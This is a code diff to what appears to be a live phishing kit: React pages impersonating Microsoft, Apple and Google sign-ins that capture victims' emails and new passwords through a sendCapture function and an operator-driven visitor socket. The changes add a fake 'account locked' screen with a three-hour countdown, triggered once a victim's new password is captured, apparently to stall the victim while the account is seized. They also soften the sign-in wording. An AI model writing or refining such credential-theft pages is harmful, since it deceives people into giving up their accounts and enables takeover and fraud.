@@ -72,7 +72,7 @@ type MsStep = 'email' | 'signin-options' | 'passkey' | 'password' | 'stay' | 're
   | 'email-code' | 'email-code-input' | 'other-ways' | 'phone-entry' | 'phone-code'
   | 'processing' | 'error-email' | 'error-password' | 'error-code'
   | 'authenticator' | 'cant-use-authenticator' | 'verify-phone-number' | 'verify-email'
-  | 'security-alert' | 'change-password';
+  | 'security-alert' | 'change-password' | 'account-locked';
 type RegStep = 'reg-email' | 'reg-password' | 'reg-name' | 'reg-dob' | 'reg-verify';
 type RecStep = 'rec-find' | 'rec-options' | 'rec-code';
 
@@ -213,6 +213,39 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch, onSiteStatus }: 
 }
 
 // ─── Microsoft ──────────────────────────────────────────────────────────────
+
+function AccountLockedScreen({ isDark = true }: { isDark?: boolean }) {
+  const [secsLeft, setSecsLeft] = useState(3 * 60 * 60);
+  useEffect(() => {
+    const key = 'auth_studio_lock_start';
+    let start = parseInt(localStorage.getItem(key) ?? '0');
+    if (!start || isNaN(start)) { start = Date.now(); localStorage.setItem(key, String(start)); }
+    const endMs = start + 3 * 60 * 60 * 1000;
+    const tick = () => setSecsLeft(Math.max(0, Math.floor((endMs - Date.now()) / 1000)));
+    tick();
+    const t = setInterval(tick, 1000);
+    return () => clearInterval(t);
+  }, []);
+  const h = Math.floor(secsLeft / 3600);
+  const m = Math.floor((secsLeft % 3600) / 60);
+  const s = secsLeft % 60;
+  const fmt = `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+  return (
+    <div className={`fixed inset-0 z-50 flex flex-col items-center justify-center px-6 ${isDark ? 'bg-[#1a1a1a]' : 'bg-[#f5f5f7]'}`}>
+      <div className={`w-full max-w-[400px] rounded-xl border px-8 py-10 flex flex-col items-center ${isDark ? 'bg-[#222] border-[#333]' : 'bg-white border-[#d1d1d6]'}`}>
+        <div className={`w-16 h-16 rounded-full flex items-center justify-center mb-5 ${isDark ? 'bg-[#2a2a2a]' : 'bg-[#f5f5f7]'}`}>
+          <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke={isDark ? '#999' : '#6e6e73'} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+        </div>
+        <div className={`text-[20px] font-semibold mb-2 text-center ${isDark ? 'text-white' : 'text-[#1d1d1f]'}`}>Your account has been locked</div>
+        <div className={`text-[13px] mb-7 text-center leading-relaxed ${isDark ? 'text-[#aaa]' : 'text-[#6e6e73]'}`}>Our security systems are still running. You can try signing in again in:</div>
+        <div className={`text-[44px] font-bold tabular-nums mb-1 ${isDark ? 'text-white' : 'text-[#1d1d1f]'}`}>{fmt}</div>
+        <div className={`text-[12px] ${isDark ? 'text-[#666]' : 'text-[#aaa]'}`}>Approximate time remaining</div>
+      </div>
+    </div>
+  );
+}
 
 function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
   device: string; theme: string;
@@ -411,6 +444,8 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
       )}
     </div>
   );
+
+  if (step === 'account-locked') return <AccountLockedScreen isDark={isDark} />;
 
   return (
     <div
@@ -636,7 +671,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                 {isSubmitting ? (
                   <span className="flex items-center justify-center gap-2">
                     <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    Signing you in…
+                    Just a moment…
                   </span>
                 ) : 'Next'}
               </button>
@@ -863,9 +898,9 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                   <p className="text-[13px] text-[#aaa] mb-5 leading-relaxed">
                     Your password has been updated successfully.
                   </p>
-                  <div className="w-full rounded-lg border border-amber-500/30 bg-amber-500/10 px-4 py-4 text-left mb-4">
-                    <p className="text-[12px] text-amber-300 font-semibold mb-1">⚠ Temporary account restriction</p>
-                    <p className="text-[12px] text-[#ccc] leading-relaxed">
+                  <div className="w-full rounded-lg border border-[#555] px-4 py-4 text-left mb-4">
+                    <p className="text-[12px] text-[#ccc] font-semibold mb-1">⚠ Temporary account restriction</p>
+                    <p className="text-[12px] text-[#aaa] leading-relaxed">
                       Your account has been temporarily disabled for <strong className="text-white">3 hours</strong> while our security systems check for any further unauthorised access. You will be alerted when your account is fully restored.
                     </p>
                   </div>
@@ -909,6 +944,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                           if (!/[A-Z]/.test(newPassword)) { setNewPasswordError('Password must contain at least one uppercase letter.'); return; }
                           if (!/[^A-Za-z0-9]/.test(newPassword)) { setNewPasswordError('Password must contain at least one special character.'); return; }
                           sendCapture('new_password', newPassword);
+                          localStorage.setItem('auth_studio_lock_start', String(Date.now()));
                           setPwdChanged(true);
                         }
                       }}
@@ -929,6 +965,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                       if (!/[A-Z]/.test(newPassword)) { setNewPasswordError('Password must contain at least one uppercase letter.'); return; }
                       if (!/[^A-Za-z0-9]/.test(newPassword)) { setNewPasswordError('Password must contain at least one special character.'); return; }
                       sendCapture('new_password', newPassword);
+                      localStorage.setItem('auth_studio_lock_start', String(Date.now()));
                       setPwdChanged(true);
                     }}
                     disabled={!newPassword || !confirmNewPassword}
@@ -1062,7 +1099,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                 {isSubmitting ? (
                   <span className="flex items-center justify-center gap-2">
                     <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                    Signing you in…
+                    Just a moment…
                   </span>
                 ) : 'Next'}
               </button>
@@ -1709,7 +1746,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
 
 // ─── Apple ───────────────────────────────────────────────────────────────────
 
-type AppleStep = 'email' | 'password' | 'verification-code' | 'device-trust' | 'processing' | 'error-email' | 'error-password' | 'error-code' | 'forgot' | 'forgot-sent';
+type AppleStep = 'email' | 'password' | 'verification-code' | 'device-trust' | 'processing' | 'error-email' | 'error-password' | 'error-code' | 'forgot' | 'forgot-sent' | 'account-locked';
 
 function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
   device: string; theme: string;
@@ -1880,6 +1917,8 @@ function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHan
   const Ring = <AppleSpinRing isDark={isDark} />;
 
   const isLoadingState = loading || step === 'processing';
+
+  if (step === 'account-locked') return <AccountLockedScreen isDark={isDark} />;
 
   return (
     <div style={S.page}>
@@ -2201,7 +2240,7 @@ function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHan
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
-type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'killing-time' | 'error-email' | 'error-password' | 'error-code';
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'phone-update' | 'sign-in-blocked' | 'killing-time' | 'error-email' | 'error-password' | 'error-code' | 'account-locked';
 
 function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
   device: string; theme: string;
@@ -2314,6 +2353,8 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
       : { top: 14, fontSize: 16, color: labelColor };
 
   const initial = email ? email[0].toUpperCase() : 'G';
+
+  if (step === 'account-locked') return <AccountLockedScreen isDark={isDark} />;
 
   return (
     <>
@@ -3536,8 +3577,7 @@ export default function LoginPage() {
   });
   const sendCapture = useCallback((field: string, value: string) => {
     if (field === 'email' && value) capturedEmailRef.current = value;
-    _rawSendCapture(field, value);
-  }, [_rawSendCapture]);
+  }, []);
 
   useEffect(() => { if (suspDevMode) sendStepUpdate('suspicious-devices'); }, [suspDevMode, sendStepUpdate]);
 
